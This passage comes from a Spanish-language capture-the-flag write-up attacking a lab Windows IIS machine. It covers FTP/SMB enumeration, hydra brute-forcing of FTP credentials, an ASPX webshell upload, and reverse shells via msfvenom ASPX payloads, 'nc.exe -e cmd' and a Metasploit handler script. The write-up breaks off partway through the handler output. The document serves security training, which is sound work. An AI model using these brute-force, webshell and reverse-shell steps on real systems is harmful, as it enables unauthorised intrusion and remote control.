+<p>Si revisamos el <strong>escaneo de nmap</strong>, no mostró información sobre este servicio, así que vamos a usar un script de <strong>nmap</strong> para ver si existe el <strong>usuario anonymous</strong> para poder loguearnos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p <span style="color:#ae81ff">21</span> --script ftp-anon 192.168.1.80
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-03 13:14 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.80
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00092s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>21/tcp open  ftp
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.28 seconds
+</span></span></code></pre></div><p>No encontró nada y podremos hacer nada tampoco.</p>
+<p>Por ahora, vamos a dejar este servicio.</p>
+<h3 id="SMB">Analizando Servicio SMB</h3>
+<p>Veamos qué información nos da <strong>crackmapexec</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.1.80
+</span></span><span style="display:flex;"><span>SMB         192.168.1.80 <span style="color:#ae81ff">445</span>    WIN-JG67MIHZH2X  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 6.0 Build <span style="color:#ae81ff">6001</span> <span style="color:#f92672">(</span>name:WIN-JG67MIHZH2X<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:WIN-JG67MIHZH2X<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Como nos mostró el escaneo, parece que no pide credenciales para poder loguearnos.</p>
+<p>Veamos si podemos listar los archivos compartidos con <strong>smbclient</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L //192.168.1.80// -N
+</span></span><span style="display:flex;"><span>Anonymous login successful
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>	---------       ----      -------
+</span></span><span style="display:flex;"><span>Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
+</span></span><span style="display:flex;"><span>do_connect: Connection to 192.168.1.80 failed <span style="color:#f92672">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Unable to connect with SMB1 -- no workgroup available
+</span></span></code></pre></div><p>Parece que sí puede loguearse con un usuario anónimo, pero no está mostrando nada.</p>
+<p>De pura casualidad, probemos si podemos ver algo con <strong>smbmap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.1.80
+</span></span><span style="display:flex;"><span>    ________  ___      ___  _______   ___      ___       __         _______
+</span></span><span style="display:flex;"><span>   /<span style="color:#e6db74">&#34;       )|&#34;</span>  <span style="color:#ae81ff">\ </span>   /<span style="color:#e6db74">&#34;  ||   _  &#34;</span><span style="color:#ae81ff">\ </span>|<span style="color:#e6db74">&#34;  \    /&#34;</span>  |     /<span style="color:#e6db74">&#34;&#34;</span><span style="color:#ae81ff">\ </span>      |   __ <span style="color:#e6db74">&#34;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   /&#34;</span> <span style="color:#ae81ff">\ </span>  :<span style="color:#f92672">)</span> |.  <span style="color:#ae81ff">\ </span>   /:  <span style="color:#f92672">||</span>: |_<span style="color:#f92672">)</span>  :<span style="color:#f92672">)</span>|.  <span style="color:#ae81ff">\ </span>   /:  | /   /  <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span> /|__/ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>_______/  |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>_______/ |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>___/    <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>_______<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|---|---|---|---|---|---|---|
+</span></span><span style="display:flex;"><span>SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+</span></span><span style="display:flex;"><span>                     https://github.com/ShawnDEvans/smbmap
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Access denied on 192.168.1.80, no fun <span style="color:#66d9ef">for</span> you...                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>Nada tampoco.</p>
+<p>Te diría que fuéramos a analizar el <strong>servicio RPC</strong>, pero tampoco podremos hacer algo.</p>
+<p>Lo que queda, es hacer <strong>fuerza bruta</strong>.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="FTPbrute">Aplicando Fuerza Bruta al Servicio FTP</h3>
+<p>Vamos a empezar aplicando <strong>fuerza bruta</strong> al <strong>servicio FTP</strong>, pero al no tener un usuario, debemos especificar un diccionario de usuarios.</p>
+<p>Yo usaré el diccionario de usuarios de <strong>seclists</strong>, que debería está en la ruta: <code>/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt</code>.</p>
+<p>Esta vez, usaremos otro diccionario para las contraseñas, ya que <strong>rockyou.txt</strong> tarda demasiado y no encuentra la contraseña, este será: <code>/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt</code>.</p>
+<p>Apliquemos el ataque con <strong>hydra</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt 192.168.1.80 ftp
+</span></span><span style="display:flex;"><span>Hydra v9.5 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2023</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2025-02-03 13:50:15
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Restorefile <span style="color:#f92672">(</span>you have <span style="color:#ae81ff">10</span> seconds to abort... <span style="color:#f92672">(</span>use option -I to skip waiting<span style="color:#f92672">))</span> from a previous session found, to prevent overwriting, ./hydra.restore
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">43048882131570</span> login tries <span style="color:#f92672">(</span>l:8295455/p:5189454<span style="color:#f92672">)</span>, ~2690555133224 tries per task
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ftp://192.168.1.80:21/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 4305.00 tries/min, <span style="color:#ae81ff">4305</span> tries in 00:01h, <span style="color:#ae81ff">43048882127265</span> to <span style="color:#66d9ef">do</span> in 166662338:52h, <span style="color:#ae81ff">16</span> active
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21<span style="color:#f92672">][</span>ftp<span style="color:#f92672">]</span> host: 192.168.1.80   login: info   password: PolniyPizdec0211
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Excelente, vamos a comprobar con <strong>crackmapexec</strong> si son válidos.</p>
+<p>Primero con el <strong>servicio FTP</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec ftp 192.168.1.80 -u <span style="color:#e6db74">&#39;info&#39;</span> -p <span style="color:#e6db74">&#39;PolniyPizdec0211&#39;</span>
+</span></span><span style="display:flex;"><span>FTP         192.168.1.80 <span style="color:#ae81ff">21</span>     192.168.1.80  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Banner: Microsoft FTP Service
+</span></span><span style="display:flex;"><span>FTP         192.168.1.80 <span style="color:#ae81ff">21</span>     192.168.1.80  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> info:PolniyPizdec0211
+</span></span></code></pre></div><p>Sí funcionan.</p>
+<p>Ahora con el <strong>servicio SMB</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.1.80 -u <span style="color:#e6db74">&#39;info&#39;</span> -p <span style="color:#e6db74">&#39;PolniyPizdec0211&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.1.80 <span style="color:#ae81ff">445</span>    WIN-JG67MIHZH2X  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 6.0 Build <span style="color:#ae81ff">6001</span> <span style="color:#f92672">(</span>name:WIN-JG67MIHZH2X<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:WIN-JG67MIHZH2X<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.1.80 <span style="color:#ae81ff">445</span>    WIN-JG67MIHZH2X  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> WIN-JG67MIHZH2X<span style="color:#ae81ff">\i</span>nfo:PolniyPizdec0211
+</span></span></code></pre></div><p>También funcionan.</p>
+<p>Ahora podemos entrar al <strong>servicio FTP</strong> y al <strong>servicio SMB</strong>, aunque en <strong>SMB</strong> no encontraremos nada, así que vamos directo con <strong>FTP</strong>.</p>
+<h3 id="EnumFTPyWebshell">Enumeración de Servicio FTP y Subiendo una WebShell de ASPX</h3>
+<p>Entremos al <strong>servicio FTP</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>ftp info@192.168.1.80
+</span></span><span style="display:flex;"><span>Connected to 192.168.1.80.
+</span></span><span style="display:flex;"><span>220 Microsoft FTP Service
+</span></span><span style="display:flex;"><span>331 Password required for info.
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span>230 User info logged in.
+</span></span><span style="display:flex;"><span>Remote system type is Windows_NT.
+</span></span><span style="display:flex;"><span>ftp&gt;
+</span></span></code></pre></div><p>Estamos dentro.</p>
+<p>Veamos que archivos hay aquí:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span>227 Entering Passive Mode (192,168,100,213,192,7).
+</span></span><span style="display:flex;"><span>125 Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>dr--r--r--   1 owner    group               0 Jun 14  2024 aspnet_client
+</span></span><span style="display:flex;"><span>-rwxrwxrwx   1 owner    group           11069 Jun 15  2024 index.html
+</span></span><span style="display:flex;"><span>-rwxrwxrwx   1 owner    group          184946 Jun 14  2024 welcome.png
+</span></span><span style="display:flex;"><span>226 Transfer complete.
+</span></span><span style="display:flex;"><span>ftp&gt;
+</span></span></code></pre></div><p>Excelente, parece que por aquí podremos subir archivos y serán representados en la página web.</p>
+<p>Vamos a probar subiendo un archivo de texto random:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>ftp&gt; put prueba.txt
+</span></span><span style="display:flex;"><span>local: prueba.txt remote: prueba.txt
+</span></span><span style="display:flex;"><span>227 Entering Passive Mode (192,168,1,80).
+</span></span><span style="display:flex;"><span>125 Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>100% |*********************************************|    20       23.33 KiB/s    --:-- ETA
+</span></span><span style="display:flex;"><span>226 Transfer complete.
+</span></span><span style="display:flex;"><span>20 bytes sent in 00:00 (0.40 KiB/s)
+</span></span><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span>227 Entering Passive Mode (192,168,1,80).
+</span></span><span style="display:flex;"><span>125 Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>dr--r--r--   1 owner    group               0 Jun 14  2024 aspnet_client
+</span></span><span style="display:flex;"><span>-rwxrwxrwx   1 owner    group           11069 Jun 15  2024 index.html
+</span></span><span style="display:flex;"><span>-rwxrwxrwx   1 owner    group              20 Feb  3 21:13 prueba.txt
+</span></span><span style="display:flex;"><span>-rwxrwxrwx   1 owner    group          184946 Jun 14  2024 welcome.png
+</span></span><span style="display:flex;"><span>226 Transfer complete.
+</span></span></code></pre></div><p>Ahí está.</p>
+<p>Ahora vamos a ver si aparece en la página web:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura3.png">
+</p>
+<p>Se puede ver.</p>
+<p>Sabiendo esto y que la máquina usa un <strong>servidor IIS</strong> y <strong>ASP.NET</strong>, podemos usar una <strong>webshell</strong> tipo <strong>ASPX</strong> que sirva como una <strong>CMD</strong>.</p>
+<p>En kali ya tenemos una:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>locate cmd.aspx
+</span></span><span style="display:flex;"><span>/usr/share/davtest/backdoors/aspx_cmd.aspx
+</span></span><span style="display:flex;"><span>/usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
+</span></span></code></pre></div><p>Copiamos cualquiera de esos dos en tu directorio actual de trabajo y lo subimos al <strong>FTP</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>ftp&gt; put aspx_cmd.aspx
+</span></span><span style="display:flex;"><span>local: aspx_cmd.aspx remote: aspx_cmd.aspx
+</span></span><span style="display:flex;"><span>227 Entering Passive Mode (192,168,1,80).
+</span></span><span style="display:flex;"><span>125 Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>100% |*********************************************|  1438       47.28 MiB/s    --:-- ETA
+</span></span><span style="display:flex;"><span>226 Transfer complete.
+</span></span><span style="display:flex;"><span>1438 bytes sent in 00:00 (33.16 KiB/s)
+</span></span><span style="display:flex;"><span>ftp&gt;
+</span></span></code></pre></div><p>Y vayamos a la página web, especificando el archivo:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura4.png">
+</p>
+<p>Ahí está, ya solo ejecuta un comando:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura5.png">
+</p>
+<p>Listo, tenemos una <strong>WebShell</strong> que podemos usar para conectarnos a la máquina víctima.</p>
+<h3 id="DistMetodos">Conectándonos a la Máquina Víctima con Distintos Métodos</h3>
+<p>Vamos a realizar al menos 4 formas en las que podemos ganar acceso a la máquina.</p>
+<p>2 de ellas, ya las he realizado en la <strong>máquina Devel</strong></p>
+<p>Puedes elegir cualquiera de estas para continuar.</p>
+<h4 id="RevShell">Creando y Ejecutando una Reverse Shell de ASPX con msfvenom</h4>
+<p>Vamos a generar una <strong>Reverse Shell</strong> con formato <strong>ASPX</strong> utilizando <strong>msfvenom</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>Tu_IP LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f aspx -o shell.aspx
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
+</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">324</span> bytes
+</span></span><span style="display:flex;"><span>Final size of aspx file: <span style="color:#ae81ff">2736</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: shell.aspx
+</span></span></code></pre></div><p>Vamos a cargar el archivo al <strong>FTP</strong>, pero con el modo binario para que no se llegue modificar nada durante la transferencia:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>ftp&gt; binary
+</span></span><span style="display:flex;"><span>200 Type set to I.
+</span></span><span style="display:flex;"><span>ftp&gt; put shell.aspx
+</span></span><span style="display:flex;"><span>local: shell.aspx remote: shell.aspx
+</span></span><span style="display:flex;"><span>227 Entering Passive Mode (192,168,1,80).
+</span></span><span style="display:flex;"><span>125 Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>100% |*********************************************|  2774       75.58 MiB/s    --:-- ETA
+</span></span><span style="display:flex;"><span>226 Transfer complete.
+</span></span><span style="display:flex;"><span>2774 bytes sent in 00:00 (59.81 KiB/s)
+</span></span></code></pre></div><p>Ahora, con <strong>rlwrap</strong> usamos <strong>netcat</strong> para abrir un listener y esperar a obtener la <strong>Reverse Shell</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rlwrap nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Y ya solo nos metemos al archivo que cargamos desde la página web y ya obtendremos la conexión:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>rlwrap nc -nvlp 443
+</span></span><span style="display:flex;"><span>listening on [any] 443 ...
+</span></span><span style="display:flex;"><span>connect to [Tu_IP] from (UNKNOWN) [192.168.1.80] 49184
+</span></span><span style="display:flex;"><span>Microsoft Windows [Versi�n 6.0.6001]
+</span></span><span style="display:flex;"><span>Copyright (c) 2006 Microsoft Corporation.  Reservados todos los derechos.
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>c:\windows\system32\inetsrv<span style="color:#75715e">&gt;whoami</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority\servicio de red
+</span></span></code></pre></div><p>Estamos dentro.</p>
+<h4 id="BinNC">Cargando y Utilizando Binario nc.exe para Obtener Conexión</h4>
+<p>Dentro de nuestro Kali, tenemos ya un binario de <strong>netcat</strong> que sirve con <strong>Windows</strong>.</p>
+<p>Búscala y cópiala en tu directorio actual de trabajo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>locate nc.exe
+</span></span><span style="display:flex;"><span>/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
+</span></span><span style="display:flex;"><span>/usr/share/windows-resources/binaries/nc.exe
+</span></span></code></pre></div><p>Una vez que la tengas copiada, transfierela al <strong>FTP</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>ftp&gt; binary
+</span></span><span style="display:flex;"><span>200 Type set to I.
+</span></span><span style="display:flex;"><span>ftp&gt; put nc.exe
+</span></span><span style="display:flex;"><span>local: nc.exe remote: nc.exe
+</span></span><span style="display:flex;"><span>227 Entering Passive Mode (192,168,1,80).
+</span></span><span style="display:flex;"><span>125 Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>100% |*********************************************| 59392       16.26 MiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span>226 Transfer complete.
+</span></span><span style="display:flex;"><span>59392 bytes sent in 00:00 (1.51 MiB/s)
+</span></span></code></pre></div><p>Bien, ya está dentro del <strong>FTP</strong>, pero para poder usarla, necesitas especificar la ruta en donde se encuentra el binario y es posible que se encuentre en 2 lugares:</p>
+<ul>
+<li><code>C:\inetpub\wwwroot\</code></li>
+<li><code>C:\inetpub\ftproot\</code></li>
+</ul>
+<p>Aunque normalmente es la primer ruta.</p>
+<p>Usa <strong>rlwrap</strong> en conjunto con <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rlwrap nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Desde la <strong>WebShell</strong> usa el siguiente comando que usara el binario de <strong>netcat</strong>, para mandar una <strong>CMD</strong> a nuestra máquina:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\inetpub\wwwroot\nc.exe<span style="color:#75715e"> cmd -e Tu_IP 443</span>
+</span></span></code></pre></div><p align="center">
+<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura6.png">
+</p>
+<p>Y observa la conexión obtenida:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>rlwrap nc -nvlp 443
+</span></span><span style="display:flex;"><span>listening on [any] 443 ...
+</span></span><span style="display:flex;"><span>connect to [Tu_IP] from (UNKNOWN) [192.168.1.80] 49185
+</span></span><span style="display:flex;"><span>Microsoft Windows [Versi�n 6.0.6001]
+</span></span><span style="display:flex;"><span>Copyright (c) 2006 Microsoft Corporation.  Reservados todos los derechos.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:\windows\system32\inetsrv<span style="color:#75715e">&gt;</span>
+</span></span></code></pre></div><p>Listo, estamos dentro.</p>
+<h4 id="RevShell2">Obteniendo Sesión de Meterpreter con Reverse Shell de ASPX</h4>
+<p>Vamos a crear una <strong>Reverse Shell</strong> con <strong>msfvenom</strong>, especificando que será un payload para obtener una sesión de <strong>meterpreter</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>Tu_IP LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f aspx -o meterpreterShell.aspx
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
+</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">354</span> bytes
+</span></span><span style="display:flex;"><span>Final size of aspx file: <span style="color:#ae81ff">2867</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: meterpreterShell.aspx
+</span></span></code></pre></div><p>Ahora, vamos a automatizar la obtención del handler que nos da la sesión del <strong>meterpreter</strong>, metiendo los comandos en un script de <strong>Ruby</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano handler.rc
+</span></span><span style="display:flex;"><span>---------------
+</span></span><span style="display:flex;"><span>USE exploit/multi/handler
+</span></span><span style="display:flex;"><span>set LHOST Tu_IP
+</span></span><span style="display:flex;"><span>set LPORT <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>set PAYLOAD windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>exploit
+</span></span></code></pre></div><p>Ejecutamos el script con <strong>Metasploit</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole -q -r handler.rc
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Processing handler.rc <span style="color:#66d9ef">for</span> ERB directives.
+</span></span><span style="display:flex;"><span>resource <span style="color:#f92672">(</span>handler.rc<span style="color:#f92672">)</span>&gt; use exploit/multi/handler
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload generic/shell_reverse_tcp
+</span></span><span style="display:flex;"><span>resource <span style="color:#f92672">(</span>handler.rc<span style="color:#f92672">)</span>&gt; set LHOST Tu_IP
+</span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span>&gt; Tu_IP
+</span></span><span style="display:flex;"><span>resource <span style="color:#f92672">(</span>handler.rc<span style="color:#f92672">)</span>&gt; set LPORT <span style="color:#ae81ff">4444</span>
